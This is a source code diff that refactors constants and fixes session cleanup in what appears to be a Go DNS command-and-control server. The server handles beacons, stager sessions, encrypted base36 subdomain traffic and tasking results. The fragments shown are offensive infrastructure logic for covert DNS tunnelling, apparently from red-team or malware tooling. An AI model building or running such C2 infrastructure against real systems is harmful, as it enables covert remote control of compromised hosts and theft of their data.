@@ -17,26 +17,7 @@ import (
 	"time"
 )
 
-const (
-	// Task ID numbering
-	taskCounterStart = 1000
-
-	// Subdomain analysis constants
-	legitimateSubdomainMaxLength = 20
-	base36MinLength              = 30
-	base36LongStringThreshold    = 50
-
-	// Timestamp validation
-	unixTimestampMinLength = 10
-	unixTimestampMaxLength = 11
-
-	// Result preview settings
-	resultPreviewMaxLength = 200
-
-	// Session expiration times
-	stagerSessionTimeout  = 3 * time.Hour // Stager sessions expire after 3 hours (allows slow downloads)
-	expectedResultTimeout = 1 * time.Hour // Expected results expire after 1 hour
-)
+// Constants are now defined in constants.go
 
 // Beacon represents a connected beacon client
 type Beacon struct {
@@ -124,7 +105,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *
 		expectedResults: make(map[string]*ExpectedResult),
 		stagerSessions:  make(map[string]*StagerSession),
 		recentMessages:  make(map[string]time.Time),
-		taskCounter:     taskCounterStart,
+		taskCounter:     TaskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
 		jitterConfig:    jitterConfig,
@@ -339,17 +320,24 @@ func renderTaskResultProgress(received, total int, taskID string) string {
 
 // cleanupExpiredSessions periodically removes expired stager sessions and expected results
 func (c2 *C2Manager) cleanupExpiredSessions() {
-	ticker := time.NewTicker(5 * time.Minute)
+	ticker := time.NewTicker(CleanupInterval)
 	defer ticker.Stop()
 
 	for range ticker.C {
 		c2.mutex.Lock()
 		now := time.Now()
 
-		// Clean up expired stager sessions
+		// Clean up expired stager sessions (collect IPs first to avoid iteration issues)
+		var expiredSessionIPs []string
 		for ip, session := range c2.stagerSessions {
-			if now.Sub(session.LastActivity) > stagerSessionTimeout {
-				// Stop progress updater before deleting session
+			if now.Sub(session.LastActivity) > StagerSessionTimeout {
+				expiredSessionIPs = append(expiredSessionIPs, ip)
+			}
+		}
+
+		// Now safely stop progress updaters and delete sessions
+		for _, ip := range expiredSessionIPs {
+			if session, exists := c2.stagerSessions[ip]; exists {
 				c2.stopProgressUpdater(session)
 				delete(c2.stagerSessions, ip)
 				if c2.debug {
@@ -360,7 +348,7 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 
 		// Clean up expired expected results
 		for taskID, expected := range c2.expectedResults {
-			if now.Sub(expected.ReceivedAt) > expectedResultTimeout {
+			if now.Sub(expected.ReceivedAt) > ExpectedResultTimeout {
 				delete(c2.expectedResults, taskID)
 				if c2.debug {
 					logf("[C2] Cleaned up expired expected result for task %s", taskID)
@@ -368,9 +356,9 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 			}
 		}
 
-		// Clean up recent message hashes older than 30 seconds (DNS retries complete)
+		// Clean up recent message hashes older than RecentMessageTTL
 		for msgHash, timestamp := range c2.recentMessages {
-			if now.Sub(timestamp) > 30*time.Second {
+			if now.Sub(timestamp) > RecentMessageTTL {
 				delete(c2.recentMessages, msgHash)
 			}
 		}
@@ -442,7 +430,7 @@ func isLegitimateSubdomain(subdomain string) bool {
 
 	// If subdomain contains only letters and numbers with dashes (no base36-like pattern)
 	// and is reasonably short, it's probably legitimate
-	if len(subdomain) <= legitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
+	if len(subdomain) <= LegitimateSubdomainMaxLength && !looksLikeBase36(subdomain) {
 		return true
 	}
 
@@ -457,7 +445,7 @@ func looksLikeBase36(s string) bool {
 	clean := strings.ReplaceAll(s, ".", "")
 
 	// Must be reasonably long to be encoded data (base36 encoded AES-GCM data is typically long)
-	if len(clean) < base36MinLength {
+	if len(clean) < Base36MinLength {
 		return false
 	}
 
@@ -472,7 +460,7 @@ func looksLikeBase36(s string) bool {
 	// Additional heuristics for base36 encoded data:
 	// - Very long strings are likely encoded data
 	// - High entropy (good mix of numbers and letters) suggests encoding
-	if len(clean) > base36LongStringThreshold {
+	if len(clean) > Base36LongStringThreshold {
 		return true
 	}
 
@@ -492,7 +480,7 @@ func looksLikeBase36(s string) bool {
 	}
 
 	// If it has both numbers and letters and is reasonably long, it's likely base36 data
-	return hasNumbers && hasLetters && len(clean) >= base36MinLength
+	return hasNumbers && hasLetters && len(clean) >= Base36MinLength
 }
 
 // processBeaconQuery processes a DNS query from a beacon and returns appropriate response
@@ -609,7 +597,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	if len(timestampParts) > 1 {
 		// Check if last part is a timestamp (numeric)
 		lastPart := timestampParts[len(timestampParts)-1]
-		if len(lastPart) >= unixTimestampMinLength && len(lastPart) <= unixTimestampMaxLength { // Unix timestamp length
+		if len(lastPart) >= UnixTimestampMinLength && len(lastPart) <= UnixTimestampMaxLength { // Unix timestamp length
 			if _, err := strconv.ParseInt(lastPart, 10, 64); err == nil {
 				// Remove timestamp
 				decoded = strings.Join(timestampParts[:len(timestampParts)-1], "|")
@@ -778,8 +766,8 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	// Log receipt of result (include small preview) - skip for duplicates
 	if !isDuplicate {
 		preview := result
-		if len(preview) > resultPreviewMaxLength {
-			preview = preview[:resultPreviewMaxLength] + "..."
+		if len(preview) > ResultPreviewMaxLength {
+			preview = preview[:ResultPreviewMaxLength] + "..."
 		}
 		logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
 	}
